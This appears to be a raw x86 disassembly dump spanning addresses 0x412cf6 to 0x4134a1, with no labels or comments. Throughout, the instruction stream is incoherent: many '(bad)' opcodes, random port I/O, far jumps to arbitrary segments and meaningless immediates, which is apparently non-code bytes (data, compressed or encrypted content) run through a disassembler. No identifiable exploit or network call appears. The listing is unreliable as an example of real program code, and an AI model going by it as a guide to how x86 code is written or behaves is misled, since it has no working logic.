  412cf6:	bound  eax,QWORD PTR [ecx]
  412cf8:	stos   BYTE PTR es:[edi],al
  412cf9:	js     0x412ce8
  412cfb:	in     eax,0x82
  412cfd:	lea    edi,[esi]
  412cff:	(bad)  
  412d00:	sub    BYTE PTR [eax+0x42926c4f],cl
  412d06:	lock or ebx,DWORD PTR [edx+ebx*8]
  412d0a:	mov    ds:0x806cacb4,al
  412d0f:	xchg   esi,eax
  412d10:	nop
  412d11:	mov    ebp,0x8cc3e67
  412d16:	out    0xa3,eax
  412d18:	adc    esp,ebp
  412d1a:	sbb    BYTE PTR [esp+eiz*8-0x4c],ah
  412d1e:	fs push ds
  412d20:	into   
  412d21:	pop    edx
  412d22:	push   esi
  412d23:	add    ebp,DWORD PTR [ebp+esi*8-0x32]
  412d27:	push   edi
  412d28:	jmp    0x939:0x62e5157e
  412d2f:	test   al,0xb5
  412d31:	daa    
  412d32:	sbb    BYTE PTR [ebx+0xe],bh
  412d35:	adc    ecx,DWORD PTR ds:0xcfb129ad
  412d3b:	sbb    eax,0xd0d11edd
  412d40:	stc    
  412d41:	mov    ebp,0x9f974508
  412d46:	sub    eax,0xebe0dda8
  412d4b:	adc    al,0xa7
  412d4d:	pop    eax
  412d4e:	mov    bl,0xff
  412d50:	cmp    al,0x70
  412d52:	and    dh,BYTE PTR [ebx+0x17]
  412d55:	jnp    0x412db3
  412d57:	sbb    eax,0x980cef0c
  412d5c:	sub    esp,DWORD PTR [ecx+0x4e2e24d5]
  412d62:	jno    0x412dbb
  412d64:	ds loope 0x412d04
  412d67:	out    0x21,al
  412d69:	add    eax,0x11ad4252
  412d6e:	leave  
  412d6f:	fs popf 
  412d71:	push   ds
  412d72:	pop    ebx
  412d73:	jl     0x412cf8
  412d75:	fs push edx
  412d77:	ins    DWORD PTR es:[edi],dx
  412d78:	add    BYTE PTR [ecx],0xb6
  412d7b:	icebp  
  412d7c:	fs or  eax,0x16f8a4b3
  412d82:	sub    esp,DWORD PTR [edx]
  412d84:	add    esi,DWORD PTR [ecx]
  412d86:	jns    0x412dd8
  412d88:	jnp    0x412d2b
  412d8a:	aam    0xbd
  412d8c:	sub    ecx,DWORD PTR [ecx]
  412d8e:	jecxz  0x412d31
  412d90:	sub    bh,BYTE PTR [edi+0x6c15ebce]
  412d96:	adc    cl,ah
  412d98:	inc    esp
  412d99:	sub    dh,dl
  412d9b:	mov    edi,0xe3d3140a
  412da0:	fs jae 0x412e14
  412da3:	js     0x412d5d
  412da5:	lds    eax,FWORD PTR [esi+0x1a6c51ab]
  412dab:	xlat   BYTE PTR ds:[ebx]
  412dac:	mov    ch,bl
  412dae:	cmp    BYTE PTR [edi+eiz*2-0x4a],bl
  412db2:	and    eax,0xc57164ea
  412db7:	xor    edi,DWORD PTR [ecx+0x46e769fb]
  412dbd:	push   0xb8bd8514
  412dc2:	cmp    BYTE PTR [eax+0x6db0fe4c],ah
  412dc8:	test   BYTE PTR [edi+0x4b27ad55],0x5b
  412dcf:	pop    es
  412dd0:	repz xchg esp,eax
  412dd2:	sub    eax,0x34015406
  412dd7:	or     BYTE PTR [edi],al
  412dd9:	div    ah
  412ddb:	jmp    0x412dcc
  412ddd:	test   DWORD PTR [ebx-0x2bbfd5cc],ebx
  412de3:	pop    edi
  412de4:	xlat   BYTE PTR ds:[ebx]
  412de5:	and    eax,0xd1c0ade5
  412dea:	popa   
  412deb:	repz fmul DWORD PTR [ecx+0x48]
  412def:	out    0x77,al
  412df1:	sar    DWORD PTR [ebp+0x25],cl
  412df4:	les    esi,FWORD PTR [ecx-0x7d]
  412df7:	cdq    
  412df8:	cwde   
  412df9:	stc    
  412dfa:	mov    bl,0x4b
  412dfc:	data16 fwait
  412dfe:	icebp  
  412dff:	std    
  412e00:	xor    dh,BYTE PTR [ebp+0x21]
  412e03:	mov    ebx,0x71193cf5
  412e08:	sbb    BYTE PTR [esi-0x77580ef6],bh
  412e0e:	retf   0x4ab0
  412e11:	inc    edi
  412e12:	push   esp
  412e13:	sbb    ecx,DWORD PTR [ecx]
  412e15:	push   0xffffff83
  412e17:	xchg   ecx,eax
  412e18:	jg     0x412e15
  412e1a:	mov    dl,BYTE PTR [edx]
  412e1c:	je     0x412e3d
  412e1e:	and    BYTE PTR [esi+0x1f],al
  412e21:	ins    DWORD PTR es:[edi],dx
  412e22:	sbb    al,0x43
  412e24:	push   ecx
  412e25:	fmulp  st(2),st
  412e27:	xchg   ebx,eax
  412e28:	(bad)  
  412e29:	clc    
  412e2a:	xor    eax,ebp
  412e2c:	sub    DWORD PTR [di+0x66c2],ebx
  412e31:	lock or BYTE PTR [ecx-0x7fe548d9],bl
  412e38:	rcr    BYTE PTR [esi],0xe1
  412e3b:	daa    
  412e3c:	mov    esp,DWORD PTR ss:[eiz*4+0x57f27d54]
  412e44:	xchg   edi,eax
  412e46:	sbb    DWORD PTR [eax+0x10977017],edi
  412e4c:	mov    dl,0xf1
  412e4e:	and    ah,BYTE PTR [ebx]
  412e50:	js     0x412e77
  412e52:	gs push ds
  412e54:	cwde   
  412e55:	leave  
  412e56:	mov    ds:0x12dea47e,al
  412e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e5c:	icebp  
  412e5d:	cld    
  412e5e:	pop    ds
  412e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e60:	pushf  
  412e61:	fnsave [edx+0x3e743375]
  412e67:	xor    edx,ebx
  412e69:	jl     0x412e1b
  412e6b:	cmp    al,0x28
  412e6d:	or     ecx,DWORD PTR [ebx]
  412e6f:	sbb    al,0x21
  412e71:	xor    esi,edx
  412e73:	jnp    0x412e08
  412e75:	xor    eax,0x62d6c972
  412e7a:	iret   
  412e7b:	or     cl,ah
  412e7d:	pop    ds
  412e7e:	aas    
  412e7f:	aad    0xe4
  412e81:	sti    
  412e82:	ds xchg edx,eax
  412e84:	(bad)
  412e88:	int    0xc6
  412e8a:	cmp    BYTE PTR [edx+0x7b03102e],cl
  412e90:	inc    ebp
  412e91:	sbb    edi,DWORD PTR [ebx]
  412e93:	rcl    ebp,cl
  412e95:	neg    DWORD PTR [ecx+0x2aecdaf2]
  412e9b:	sub    eax,0xe72a683b
  412ea0:	mov    cl,0x8
  412ea2:	xor    cl,ah
  412ea4:	add    eax,0xe9932170
  412ea9:	shl    BYTE PTR [ecx],cl
  412eab:	loopne 0x412e93
  412ead:	addr16 xchg ebp,eax
  412eaf:	test   DWORD PTR [edx],0xdb3e78ec
  412eb5:	imul   esi,esi,0x51e1b8b3
  412ebb:	loope  0x412f0a
  412ebd:	add    al,0x2c
  412ebf:	jno    0x412ea7
  412ec1:	retf   
  412ec2:	sub    edi,DWORD PTR es:[edx+0xb]
  412ec6:	cmc    
  412ec7:	mov    bl,0xc2
  412ec9:	pop    esi
  412eca:	retf   
  412ecb:	das    
  412ecc:	jns    0x412eb2
  412ece:	stos   DWORD PTR es:[edi],eax
  412ecf:	test   BYTE PTR [esp+edx*1-0x6168f9da],ch
  412ed6:	aad    0x81
  412ed8:	cs xchg ebx,eax
  412eda:	inc    ebx
  412edb:	mov    ah,0xb4
  412edd:	outs   dx,BYTE PTR ds:[esi]
  412ede:	pop    esi
  412edf:	dec    ax
  412ee1:	jo     0x412eda
  412ee3:	add    esp,edx
  412ee5:	loope  0x412edd
  412ee7:	push   eax
  412ee8:	pop    eax
  412ee9:	sahf   
  412eea:	mov    ecx,0xfc864c97
  412eef:	push   ds
  412ef0:	gs sub al,0xb2
  412ef3:	popa   
  412ef4:	mov    cl,0xf9
  412ef6:	xor    al,BYTE PTR [esi-0x1215d61f]
  412efc:	cdq    
  412efd:	push   DWORD PTR [ebx]
  412eff:	add    bh,BYTE PTR [edi+0x7bef276b]
  412f05:	int3   
  412f06:	into   
  412f07:	inc    eax
  412f08:	popa   
  412f09:	pop    esp
  412f0a:	cmp    BYTE PTR [eax],al
  412f0c:	jo     0x412f24
  412f0e:	or     edx,ebx
  412f10:	imul   ecx,DWORD PTR [edi],0x3e
  412f13:	dec    ecx
  412f14:	add    al,0x47
  412f16:	repz adc BYTE PTR ss:[ecx],dl
  412f1a:	ja     0x412ebe
  412f1c:	clc    
  412f1d:	je     0x412ee0
  412f1f:	aas    
  412f20:	ins    BYTE PTR es:[edi],dx
  412f21:	xor    eax,0x53209245
  412f26:	xor    edx,DWORD PTR [ecx+0x3]
  412f29:	jns    0x412ed6
  412f2b:	inc    edi
  412f2c:	jle    0x412f04
  412f2e:	push   esi
  412f2f:	fadd   DWORD PTR [ebx-0x4f46aac6]
  412f35:	inc    edx
  412f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f37:	out    0x39,eax
  412f39:	pop    edi
  412f3a:	sbb    dh,BYTE PTR [eax]
  412f3c:	pop    esi
  412f3d:	pop    ebx
  412f3e:	or     ch,BYTE PTR [edi]
  412f40:	stos   DWORD PTR es:[edi],eax
  412f41:	xchg   esi,eax
  412f42:	hlt    
  412f43:	shl    DWORD PTR es:[ebp+0x6d15182b],1
  412f4a:	outs   dx,BYTE PTR ds:[esi]
  412f4b:	push   esi
  412f4c:	dec    edi
  412f4d:	add    al,0x9f
  412f4f:	mov    edi,0x677d41af
  412f54:	out    0x9e,al
  412f56:	es sub bh,ah
  412f59:	neg    DWORD PTR [edi-0x383bee]
  412f5f:	mov    eax,ss:0xe8dc2792
  412f65:	scas   eax,DWORD PTR es:[edi]
  412f66:	xchg   ebp,eax
  412f67:	jbe    0x412eed
  412f69:	inc    ecx
  412f6a:	retf   0xc00c
  412f6d:	das    
  412f6e:	into   
  412f6f:	pushf  
  412f70:	sub    ebp,ebx
  412f72:	jne    0x412fc7
  412f74:	cwde   
  412f75:	ds xchg esp,eax
  412f77:	lods   eax,DWORD PTR ds:[esi]
  412f78:	xor    BYTE PTR [esi],0x8b
  412f7b:	jge    0x412f25
  412f7d:	and    esp,esp
  412f7f:	int3   
  412f80:	pop    eax
  412f81:	out    dx,eax
  412f82:	mov    edx,0xe2392b7d
  412f87:	inc    ebp
  412f88:	mov    ah,0xe0
  412f8a:	icebp  
  412f8b:	jl     0x412f77
  412f8d:	arpl   dx,dx
  412f8f:	push   eax
  412f90:	jge    0x412ff5
  412f92:	jecxz  0x412faf
  412f94:	sub    DWORD PTR [esi+0x3998d148],edi
  412f9a:	dec    ebp
  412f9b:	push   ds
  412f9c:	push   ds
  412f9d:	inc    edi
  412f9e:	int    0xcd
  412fa0:	repnz sbb edx,DWORD PTR [ecx+eiz*4-0x7b]
  412fa5:	sbb    al,0x86
  412fa7:	add    al,BYTE PTR [edi-0x4d82e3cd]
  412fad:	stos   DWORD PTR es:[edi],eax
  412fae:	jns    0x412f4b
  412fb0:	pop    eax
  412fb1:	mov    edx,0x7c504756
  412fb6:	aaa    
  412fb7:	nop
  412fb8:	pop    ebx
  412fb9:	push   ebx
  412fba:	retf   
  412fbb:	sub    al,0xf3
  412fbd:	and    BYTE PTR [ebp+0x62],cl
  412fc0:	scas   eax,DWORD PTR es:[edi]
  412fc1:	mov    edx,0xa1a9003b
  412fc6:	mov    ds:0x1527600d,eax
  412fcb:	or     ah,BYTE PTR [esi-0x23]
  412fce:	xlat   BYTE PTR ds:[ebx]
  412fcf:	xchg   DWORD PTR [edi],esp
  412fd1:	jmp    0x413011
  412fd3:	dec    DWORD PTR [eax+eiz*2-0x39]
  412fd7:	not    DWORD PTR [ecx]
  412fd9:	fnstcw WORD PTR [ebp+0x38]
  412fdc:	nop
  412fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fde:	fisub  DWORD PTR [esi-0x35]
  412fe1:	cmp    DWORD PTR [ebp-0x7d619506],0xa3ecdc81
  412feb:	and    BYTE PTR [ecx+0x60],bh
  412fee:	sub    eax,0x6a4cc6a2
  412ff3:	xchg   DWORD PTR [edi-0x75940662],edi
  412ff9:	loope  0x412f80
  412ffb:	call   0x6e0b8122
  413000:	jle    0x412fea
  413002:	jo     0x412ff0
  413004:	enter  0xdf72,0x30
  413008:	dec    ebx
  413009:	mov    esi,0xc7310981
  41300e:	jp     0x412fef
  413010:	or     ebx,DWORD PTR [esi]
  413012:	rol    BYTE PTR [ecx],1
  413014:	gs jo  0x41306f
  413017:	add    al,0x8a
  413019:	adc    DWORD PTR [edi+esi*1],eax
  41301c:	and    DWORD PTR [eax],esp
  41301e:	addr16 jmp 0x96cd:0x2c034bc2
  413026:	adc    bl,BYTE PTR [ebx+ebp*1-0x2983adb1]
  41302d:	ret    
  41302e:	dec    esi
  41302f:	retf   0xddb9
  413032:	stos   BYTE PTR es:[edi],al
  413033:	or     esp,DWORD PTR [edx+eax*8]
  413036:	cmc    
  413037:	mov    al,0x4c
  413039:	mov    al,0x45
  41303b:	das    
  41303c:	pushf  
  41303d:	xlat   BYTE PTR ds:[ebx]
  41303e:	mov    dh,0xd8
  413040:	xor    al,0x2
  413042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413043:	xor    DWORD PTR [edi+0x268648e1],edi
  413049:	xor    al,0x2f
  41304b:	stos   DWORD PTR es:[edi],eax
  41304c:	inc    ebp
  41304d:	mov    al,0x30
  41304f:	nop
  413050:	push   esi
  413051:	jmp    0x38e71a08
  413056:	ficomp DWORD PTR [esi]
  413058:	daa    
  413059:	test   al,0x8a
  41305b:	sar    BYTE PTR [esi+0xd],1
  41305e:	cmp    edx,DWORD PTR [edi]
  413060:	(bad)  
  413061:	pop    esp
  413062:	add    BYTE PTR [ebx+0x7ae82401],dh
  413068:	mov    ecx,DWORD PTR [edi+0x4d81a66a]
  41306e:	jle    0x413019
  413070:	and    ebp,0xfffffff8
  413073:	jns    0x413033
  413075:	out    0xf1,al
  413077:	and    ah,BYTE PTR [edi]
  413079:	dec    ebx
  41307a:	mov    ds:0x430bb14d,al
  41307f:	mov    cl,0x96
  413081:	or     DWORD PTR [edx],ebp
  413083:	mov    eax,DWORD PTR [edx]
  413085:	mov    ebp,0x1c42f11d
  41308a:	xchg   esi,eax
  41308b:	xor    BYTE PTR [esp+esi*8],0xe0
  41308f:	pop    edx
  413090:	xchg   ebx,eax
  413091:	jo     0x4130e8
  413093:	sbb    al,0x38
  413095:	outs   dx,BYTE PTR ds:[esi]
  413096:	daa    
  413097:	fsub   DWORD PTR [ebx-0x22fe83e9]
  41309d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309e:	jg     0x4130ba
  4130a0:	es jae 0x4130d0
  4130a3:	out    0x44,al
  4130a5:	push   esp
  4130a6:	push   eax
  4130a7:	mov    eax,0xbaa79d9b
  4130ac:	inc    edx
  4130ad:	mov    edx,0xeaf81116
  4130b2:	mov    eax,ds:0xf0619e82
  4130b7:	mov    ch,0xe7
  4130b9:	cli    
  4130ba:	call   0x60b5d7f7
  4130bf:	sbb    eax,DWORD PTR [eax]
  4130c1:	jmp    0x497ff276
  4130c6:	inc    ebp
  4130c7:	pop    ebp
  4130c8:	(bad)  
  4130ca:	dec    ebp
  4130cb:	fistp  WORD PTR [esi]
  4130cd:	sub    BYTE PTR [ebx-0x1be49d0a],al
  4130d3:	cld    
  4130d4:	xchg   esp,eax
  4130d5:	rcr    DWORD PTR [ecx+edx*1-0x2f],cl
  4130d9:	pop    edx
  4130da:	inc    ebx
  4130db:	sbb    BYTE PTR ds:0xe3707a0f,ah
  4130e1:	ror    BYTE PTR [eax],0xf2
  4130e4:	sbb    edi,eax
  4130e6:	adc    DWORD PTR [eax],0x16
  4130e9:	add    al,0xa4
  4130eb:	loopne 0x413089
  4130ed:	ss adc al,0xc3
  4130f0:	imul   esi
  4130f2:	push   0x6a
  4130f4:	ror    BYTE PTR gs:[eax+0x4a256aca],1
  4130fb:	loope  0x41313e
  4130fd:	mov    cl,0xdd
  4130ff:	push   esp
  413100:	dec    ecx
  413101:	jns    0x4130a0
  413103:	pop    ss
  413104:	jmp    0x287b4339
  413109:	js     0x4130a2
  41310b:	push   eax
  41310c:	xchg   DWORD PTR [esi+0x6c],ebx
  41310f:	bound  ebx,QWORD PTR [esi+0x42]
  413112:	add    dl,BYTE PTR cs:[ebp+0x24ecc42c]
  413119:	mov    al,ds:0x6a6c2e39
  41311e:	std    
  41311f:	int    0x90
  413121:	xchg   BYTE PTR ds:0x8305f24b,dh
  413127:	mov    ah,dl
  413129:	fld    st(3)
  41312b:	repz jl 0x413161
  41312e:	mov    al,0xe0
  413130:	or     ch,BYTE PTR [edx+0x6bde1925]
  413136:	sbb    BYTE PTR [esi],bh
  413138:	test   DWORD PTR [ebx+0x4a9d597e],ebp
  41313e:	fist   WORD PTR [ebp+0x1]
  413141:	xchg   DWORD PTR [edx+0x42],edx
  413144:	inc    esi
  413145:	xchg   ecx,eax
  413146:	mov    BYTE PTR [ecx-0x67],dh
  413149:	pop    es
  41314a:	in     eax,dx
  41314b:	jmp    0xb919:0xeb312cbc
  413152:	dec    eax
  413153:	xlat   BYTE PTR ds:[ebx]
  413154:	ret    0x758f
  413157:	out    dx,eax
  413158:	mov    al,0x6a
  41315a:	nop
  41315b:	sbb    BYTE PTR ds:0x5b85ed02,0xdc
  413162:	adc    al,0xa3
  413164:	mov    ecx,0x50ee0f16
  413169:	gs push edx
  41316b:	in     al,0x9c
  41316d:	sbb    DWORD PTR [ecx],eax
  41316f:	je     0x41314e
  413171:	mov    al,ds:0x27c0b4ce
  413176:	jmp    0x413118
  413178:	popa   
  413179:	cwde   
  41317a:	push   esi
  41317b:	xchg   cx,ax
  41317d:	inc    edi
  41317e:	out    0xf7,al
  413180:	mov    bh,0x4
  413182:	or     eax,0xb5a81207
  413187:	ins    BYTE PTR es:[edi],dx
  413188:	cmp    BYTE PTR [ebx-0x32aa8a4],al
  41318e:	into   
  41318f:	mov    ds:0x21cb1bdf,eax
  413194:	popa   
  413195:	pusha  
  413196:	mov    ebx,0x83609299
  41319b:	rcl    BYTE PTR ds:0x8837ed32,cl
  4131a1:	push   eax
  4131a2:	jge    0x413168
  4131a4:	ret    0x880d
  4131a7:	icebp  
  4131a8:	leave  
  4131a9:	mov    edx,eax
  4131ab:	mov    esi,0x9e2261d2
  4131b0:	mov    esi,ebx
  4131b2:	dec    esp
  4131b3:	(bad)  
  4131b4:	jae    0x413167
  4131b6:	cwde   
  4131b7:	sub    eax,0x418380b6
  4131bc:	inc    esp
  4131bd:	test   DWORD PTR ds:0xe1f2a5ea,ebp
  4131c3:	das    
  4131c4:	pop    ebx
  4131c5:	hlt    
  4131c6:	repnz xchg ecx,eax
  4131c8:	inc    esi
  4131c9:	adc    eax,0xdf1f95e6
  4131ce:	and    DWORD PTR [eax-0x2],0xde6dac2e
  4131d5:	sub    ebx,DWORD PTR [ebp-0x6c2898fb]
  4131db:	shl    BYTE PTR [ebp+eax*2-0x30],cl
  4131df:	mov    ch,0x2b
  4131e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131e2:	pop    es
  4131e3:	or     bh,BYTE PTR [ebx+0x51]
  4131e6:	(bad)
  4131ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ec:	popf   
  4131ed:	sti    
  4131ee:	rol    ebp,1
  4131f0:	fld    DWORD PTR [eax*4-0xee5342e]
  4131f7:	jno    0x413250
  4131f9:	xchg   esp,eax
  4131fa:	in     eax,dx
  4131fb:	aad    0x43
  4131fd:	jg     0x41325d
  4131ff:	sub    al,0x63
  413201:	in     eax,dx
  413202:	ins    DWORD PTR es:[edi],dx
  413203:	(bad)  
  413205:	aam    0x4f
  413207:	iret   
  413208:	cmp    BYTE PTR [edx-0x15],dh
  41320b:	stos   DWORD PTR es:[edi],eax
  41320c:	test   DWORD PTR [ebx+0x59],esp
  41320f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413210:	sbb    ecx,DWORD PTR [eax+ebp*1-0x2b]
  413214:	adc    eax,0x20afd05b
  413219:	sub    bl,BYTE PTR [edi+ecx*8]
  41321c:	inc    edi
  41321d:	mov    ch,0xcc
  41321f:	jge    0x4131b6
  413221:	add    edx,eax
  413223:	dec    eax
  413224:	adc    eax,0x39626678
  413229:	daa    
  41322a:	sub    edx,DWORD PTR [eax]
  41322c:	loopne 0x41323f
  41322e:	call   0xeca4:0xddeb8d4f
  413235:	xchg   ebx,eax
  413236:	mov    cl,0x67
  413238:	fild   QWORD PTR [ebx]
  41323a:	dec    eax
  41323b:	pop    edi
  41323c:	dec    esp
  41323d:	pop    ebp
  41323e:	mov    dl,0x7f
  413240:	dec    esp
  413241:	mov    esi,DWORD PTR [ebx-0x64]
  413244:	aaa    
  413245:	cmp    cl,BYTE PTR [ecx+ebp*2]
  413248:	adc    BYTE PTR [eax-0x76a5f0c1],bh
  41324e:	dec    ebx
  41324f:	mov    ebp,0x3f2fff14
  413254:	mov    ch,0xe
  413256:	fistp  DWORD PTR [ecx+edi*4]
  413259:	std    
  41325a:	push   ebp
  41325b:	cwde   
  41325c:	pop    edi
  41325d:	in     al,0xca
  41325f:	aaa    
  413260:	int    0xb4
  413262:	test   DWORD PTR [edx-0x389dd484],ecx
  413268:	test   BYTE PTR [edx+0x3],bl
  41326b:	dec    edi
  41326c:	mov    ch,0x18
  41326e:	sbb    BYTE PTR [edi],ah
  413270:	out    dx,al
  413271:	lods   al,BYTE PTR ds:[esi]
  413272:	add    eax,0x891aa1db
  413277:	(bad)  
  413278:	or     esi,ecx
  41327a:	xlat   BYTE PTR ds:[ebx]
  41327b:	mov    al,0xb0
  41327d:	icebp  
  41327e:	mov    cs,WORD PTR [edx+0x4bbb974f]
  413284:	dec    esi
  413285:	or     DWORD PTR [esi],0x11
  413288:	push   ss
  413289:	in     eax,dx
  41328a:	fiadd  WORD PTR [eax]
  41328c:	fld    TBYTE PTR [ebp-0x59]
  41328f:	mov    edi,0x45b6ab2e
  413294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413295:	inc    ecx
  413296:	cmp    eax,0x9eab8b6b
  41329b:	cld    
  41329c:	sbb    al,0x35
  41329e:	mov    BYTE PTR [ebx+0x46],0x63
  4132a2:	ins    DWORD PTR es:[edi],dx
  4132a3:	or     eax,0xba047ec4
  4132a8:	addr16 out 0x4a,al
  4132ab:	mov    esi,0x605db9f4
  4132b0:	test   BYTE PTR [ebx],bl
  4132b2:	mov    ss,WORD PTR [ecx-0x9]
  4132b5:	cmp    esi,DWORD PTR [edx+0x56]
  4132b8:	xchg   ebp,eax
  4132b9:	dec    edx
  4132ba:	(bad)  
  4132bb:	loopne 0x41332f
  4132bd:	adc    edx,DWORD PTR [edx]
  4132bf:	nop
  4132c0:	adc    eax,0xff70179a
  4132c5:	mov    DWORD PTR [ebx+0x63513a2],eax
  4132cb:	in     eax,dx
  4132cc:	int3   
  4132cd:	sti    
  4132ce:	out    dx,eax
  4132cf:	pop    ebp
  4132d0:	mov    al,cs:0x405da03f
  4132d6:	xor    BYTE PTR [edi],cl
  4132d8:	es enter 0x8870,0xad
  4132dd:	inc    edx
  4132de:	jle    0x4132df
  4132e0:	sbb    DWORD PTR [esi+eax*2-0x56],ebx
  4132e4:	inc    esi
  4132e5:	inc    ebp
  4132e6:	sbb    ah,al
  4132e8:	pop    esp
  4132e9:	add    al,0xc4
  4132eb:	cdq    
  4132ec:	bound  edi,QWORD PTR ds:0x6b60060a
  4132f2:	push   es
  4132f3:	sub    ch,BYTE PTR [eax+esi*8-0x3246ab43]
  4132fa:	mov    ebx,0x4ee35724
  4132ff:	jno    0x4132ee
  413301:	cmp    esi,eax
  413303:	mov    WORD PTR [ebx+0x6c],fs
  413306:	das    
  413307:	(bad)  
  413308:	mov    ds:0xfbaf510e,eax
  41330d:	bound  edx,QWORD PTR [bx+0x77]
  413311:	mov    ch,0xb
  413313:	cmc    
  413314:	in     al,dx
  413315:	mov    DWORD PTR [esp+edi*2+0x78941e9b],esp
  41331c:	psubusw mm2,QWORD PTR ds:0x216ac90c
  413323:	dec    edx
  413324:	cwde   
  413325:	and    DWORD PTR [ecx-0x41],esp
  413328:	loop   0x41331d
  41332a:	test   al,0x78
  41332c:	inc    edi
  41332d:	add    ah,cl
  41332f:	mov    ds:0x7fb447e4,eax
  413334:	push   esp
  413335:	adc    al,0xfb
  413337:	test   BYTE PTR es:[ebx+0x49],ah
  41333b:	add    DWORD PTR [edi+0x225e8cd7],ebx
  413341:	mov    ebx,DWORD PTR [eax]
  413343:	(bad)  
  413344:	loop   0x413371
  413346:	cli    
  413347:	cmp    al,0x8
  413349:	mov    ecx,fs
  41334b:	dec    esp
  41334c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41334d:	ja     0x4133ce
  41334f:	add    al,0x27
  413351:	pop    ebx
  413352:	fadd   QWORD PTR [ecx+edx*1-0x6d]
  413356:	mov    ds:0xbfede6ec,al
  41335b:	add    edi,DWORD PTR [edi+0x66]
  41335e:	sbb    DWORD PTR [edx+eiz*8+0x582323fb],ebp
  413365:	jle    0x413343
  413367:	daa    
  413368:	js     0x413302
  41336a:	xor    DWORD PTR [ebx+0x34c51d7e],0x89ddbd5a
  413374:	inc    ebx
  413375:	shl    BYTE PTR [edx-0x20dc3994],cl
  41337b:	dec    edx
  41337c:	jae    0x413397
  41337e:	and    edx,DWORD PTR [ecx+0x4d]
  413381:	neg    DWORD PTR [ebx+edi*2+0x16]
  413385:	cmc    
  413386:	je     0x4133da
  413388:	aaa    
  413389:	lahf   
  41338a:	jmp    0x9175:0xc651cf5c
  413391:	fld    QWORD PTR [ecx-0xa1e37ca]
  413397:	and    al,0x1d
  413399:	nop
  41339a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41339b:	xchg   edi,eax
  41339c:	xchg   ebx,eax
  41339d:	out    0x56,al
  41339f:	outs   dx,DWORD PTR ds:[esi]
  4133a0:	icebp  
  4133a1:	inc    eax
  4133a2:	jae    0x4133ce
  4133a4:	xor    dl,bl
  4133a6:	mov    esp,0xe69b908d
  4133ab:	pop    edx
  4133ac:	xor    ch,al
  4133ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133af:	jge    0x41339f
  4133b1:	fcmovbe st,st(1)
  4133b3:	fcomp  st(1)
  4133b5:	mov    edx,0x2c0ae12b
  4133ba:	cwde   
  4133bb:	xchg   esi,eax
  4133bc:	loop   0x4133ac
  4133be:	es int 0xd8
  4133c1:	(bad)  
  4133c2:	push   cs
  4133c3:	fidivr WORD PTR [ebx+0x6ad87aa7]
  4133c9:	ret    
  4133ca:	scas   al,BYTE PTR es:[edi]
  4133cb:	fwait
  4133cc:	xor    BYTE PTR [eax+esi*1+0x41],cl
  4133d0:	mov    dh,0x72
  4133d2:	cmp    ecx,ebx
  4133d4:	in     eax,0x85
  4133d6:	cmp    bl,al
  4133d8:	(bad)  
  4133d9:	ja     0x4133fa
  4133db:	adc    al,0x9a
  4133dd:	aam    0x24
  4133df:	rol    DWORD PTR [ecx],0xe6
  4133e2:	pop    ss
  4133e3:	mov    al,ds:0x37e6b310
  4133e8:	(bad)  
  4133e9:	mov    esp,0xb5202ecd
  4133ee:	cwde   
  4133ef:	or     bh,BYTE PTR [edx]
  4133f1:	sub    esp,eax
  4133f3:	mov    bh,0xf1
  4133f5:	and    eax,0xa20069ee
  4133fa:	outs   dx,DWORD PTR ds:[esi]
  4133fb:	mov    ch,0x24
  4133fd:	mov    eax,0xa640fa57
  413402:	or     DWORD PTR [ebp-0x6e],ebp
  413405:	xor    BYTE PTR ds:0x5adce7fa,ch
  41340b:	mov    cl,0x4e
  41340d:	push   edi
  41340e:	mov    dh,0x6
  413410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413411:	sbb    edi,edi
  413413:	or     eax,0x20b8341
  413418:	jns    0x413434
  41341a:	dec    ecx
  41341b:	out    dx,al
  41341c:	dec    esi
  41341d:	add    esi,DWORD PTR [ecx-0x21ee57cf]
  413423:	sub    ecx,DWORD PTR [ebx-0x30]
  413426:	dec    ebx
  413427:	and    al,0x7c
  413429:	inc    edi
  41342a:	sub    eax,0x5fc824e8
  41342f:	mov    esi,0x199c4b6a
  413434:	ss scas eax,DWORD PTR es:[edi]
  413436:	xchg   ebx,eax
  413437:	nop
  413438:	adc    cl,ah
  41343a:	push   edx
  41343b:	add    BYTE PTR [edx+0x44],bh
  41343e:	cmp    esp,DWORD PTR [ecx]
  413440:	add    ebp,DWORD PTR [esi-0x5f]
  413443:	cmc    
  413444:	rcl    DWORD PTR [edi],cl
  413446:	(bad)  
  413447:	sar    BYTE PTR [ebp-0x20f40b71],0xcf
  41344e:	xor    eax,esp
  413450:	js     0x413460
  413452:	push   eax
  413453:	enter  0x4bd3,0x9
  413457:	pop    edx
  413458:	jmp    0x4133e4
  41345a:	jle    0x41349e
  41345c:	inc    esp
  41345d:	pusha  
  41345e:	iret   
  41345f:	test   eax,0xb167f970
  413464:	xchg   ebp,eax
  413465:	arpl   WORD PTR ds:0xc8002ee0,sp
  41346b:	mov    cl,0x6c
  41346d:	pop    ecx
  41346e:	add    BYTE PTR [edx+0x2b],al
  413471:	adc    eax,0x787cb64b
  413476:	adc    edi,DWORD PTR [ebx]
  413478:	fiadd  WORD PTR [esi+0x8]
  41347b:	xor    cl,bh
  41347d:	repnz les ecx,FWORD PTR [eax-0x421edeab]
  413484:	add    al,0x17
  413486:	inc    edx
  413487:	iret   
  413488:	loop   0x4134a7
  41348a:	imul   eax,ebp,0x33
  41348d:	pop    edx
  41348e:	xor    DWORD PTR [eax],0x983cc019
  413494:	pop    eax
  413495:	or     BYTE PTR [esi],cl
  413497:	dec    edx
  413498:	and    ebx,DWORD PTR [esi]
  41349a:	mov    al,0x68
  41349c:	adc    eax,0x224e6372
  4134a1:	outs   dx,DWORD PTR ds:[esi]
